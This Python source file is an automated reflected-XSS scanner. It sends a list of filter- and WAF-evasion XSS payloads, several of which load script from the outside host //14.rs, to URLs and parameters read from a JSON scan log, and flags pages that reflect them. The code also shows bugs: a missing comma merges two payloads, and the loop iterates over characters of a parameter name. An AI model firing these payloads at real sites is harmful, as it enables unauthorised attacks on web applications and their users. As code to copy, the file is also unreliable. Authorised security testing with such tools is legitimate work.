import json
import requests
import re,os
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor

xss_num = 0

def start_scan(scan_file):

    # Load the JSON data
    my_json_data = json.loads(open(scan_file).read())

    # List of payloads
    payloads = (  # Payloads for filter & WAF evasion > https://github.com/s0md3v/XSStrike
        '<script>alert("XSS")</script>',
        '\'"</Script><Html Onmouseover=(confirm)()//'
        '<imG/sRc=l oNerrOr=(prompt)() x>',
        '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
        '<deTails open oNToggle=confi\u0072m()>',
        '<img sRc=l oNerrOr=(confirm)() x>',
        '<svg/x=">"/onload=confirm()//',
        '<svg%0Aonload=%09((pro\u006dpt))()//',
        '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
        '<sCript x>confirm``</scRipt x>',
        '<Script x>prompt()</scRiPt x>',
        '<sCriPt sRc=//14.rs>',
        '<embed//sRc=//14.rs>',
        '<base href=//14.rs/><script src=/>',
        '<object//data=//14.rs>',
        '<s=" onclick=confirm``>clickme',
        '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
        '\'"><y///oNMousEDown=((confirm))()>Click',
        '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
        '<img src=x onerror=confir\u006d`1`>',
        '<svg/onload=co\u006efir\u006d`1`>')

    
    # Function to test for XSS vulnerability
    def test_xss_vulnerability(url, param, method, is_form, payload):
        global xss_num
    
        try:
            # Define a regex pattern for detecting XSS vulnerabilities in response content
            xss_pattern = re.compile(re.escape(payload), re.IGNORECASE)
            data = {
                param: payload
            }
            if method == "get" or method is None:
                response = requests.get(url, params=data)

            elif method == "post" and is_form is not None:
                response = requests.post(url, data=data)

            else:
                print("Invalid request method or configuration.")
                return
            
        
            # Check if the response contains the payload
            if xss_pattern.search(response.text):
                print(f"{Fore.GREEN} [+] {Fore.WHITE}XSS Found in {url} " + Fore.RED + payload)      

            else:
                print(f"{Fore.RED} [-] {Fore.WHITE}No XSS found in {url} " + Fore.YELLOW + payload)


        except Exception as e:
            print(Fore.RED + f"Error while testing {url}: {e}")

    # Create a ThreadPoolExecutor to run tests in parallel
    with ThreadPoolExecutor(max_workers=20) as executor:
        for item in my_json_data:
            for payload in payloads:


                for param in item["parametr"][0]["name"]:
                # Submit each test as a separate task to the ThreadPoolExecutor 
                    executor.submit(test_xss_vulnerability, item["url"], param, item["method"], item["is_form"], payload)
                    

    input(" If you Want back to menu > press")


def find_scanned_files():
    folder_path = "logs" 
    json_files = []

    for filename in os.listdir(folder_path):
        if filename.endswith(".json"):
            json_files.append(filename)
    
    return json_files
    
